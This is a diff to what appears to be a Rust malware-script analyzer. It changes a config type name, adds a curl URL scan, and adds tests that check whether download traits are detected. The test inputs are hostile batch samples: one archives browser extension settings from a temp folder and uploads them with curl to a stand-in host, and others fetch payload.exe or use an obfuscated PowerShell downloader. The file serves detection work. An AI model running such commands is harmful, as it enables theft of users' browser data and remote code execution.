@@ -727,7 +727,7 @@ mod echo_tests {
         let report = analyze(
             br#"echo.https://echo-dot.example/payload.exe>url.txt
 for /f "tokens=* delims=" %%U in (url.txt) do curl -o payload.exe %%U"#,
-            &AnalyzeConfig::default(),
+            &Config::default(),
         );
         assert!(
             report.traits.iter().any(|t| {
@@ -7037,7 +7037,7 @@ C:\Users\Public\nl.tmp malicious.example
             br#"ping -n 1 8.8.8.8
 ping 127.0.0.1
 "#,
-            &AnalyzeConfig::default(),
+            &Config::default(),
         );
 
         assert!(
@@ -12876,6 +12876,10 @@ fn analyze_inner(
             deob_scan::scan_deob_text(&out, &mut env);
         }
         profile_mark!("scan_deob_text");
+        if !env.check_deadline() {
+            deob_scan::scan_raw_curl_known_percent_urls(&raw_text, &mut env);
+        }
+        profile_mark!("raw_curl_known_percent_urls");
         // The char-index-extractor scan needs the FULL source — our
         // normalize pipeline's marker-noise stripping can mangle the
         // PS body that hosts the `function Musculos…` definition
@@ -42028,6 +42032,76 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
             )
         });
         assert!(!bad, "curl URL kept command suffix: {:?}", env.traits);
+    }
+
+    #[test]
+    fn for_f_curl_percent_url_variable_emits_structured_download() {
+        let report = analyze(
+            br#"set "uploadUrl=https://exodus.example/files/upload.php"
+for /f "delims=" %%a in ('curl -F "file=@%TEMP%\BrowserExtensionSettings.zip" "%uploadUrl%"') do set "response=%%a"
+"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://exodus.example/files/upload.php" && dst.is_none()
+            )),
+            "FOR /F curl concrete percent URL variable was not surfaced: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn powershell_compress_archive_destination_allows_later_if_exist_upload() {
+        let report = analyze(
+            br#"set "uploadUrl=https://exodus.example/files/upload.php"
+set "zipFile=%TEMP%\BrowserExtensionSettings.zip"
+powershell -command "Compress-Archive -Path '%TEMP%\ArchiveContents\*' -DestinationPath '%zipFile%'"
+if exist "%zipFile%" (
+    for /f "delims=" %%a in ('curl -F "file=@%zipFile%" "%uploadUrl%"') do set "response=%%a"
+)
+"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://exodus.example/files/upload.php" && dst.is_none()
+            )),
+            "Compress-Archive destination did not make later curl upload branch reachable: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn skipped_for_f_curl_with_known_percent_url_still_surfaces_download() {
+        let report = analyze(
+            br#"set "uploadUrl=https://exodus.example/files/upload.php"
+set "zipFile=%TEMP%\BrowserExtensionSettings.zip"
+goto end
+for /f "delims=" %%a in ('curl -F "file=@%zipFile%" "%uploadUrl%"') do set "response=%%a"
+:end
+"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://exodus.example/files/upload.php" && dst.is_none()
+            )),
+            "known URL variable in skipped FOR/F curl was not rescued: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
     }
 
     #[test]
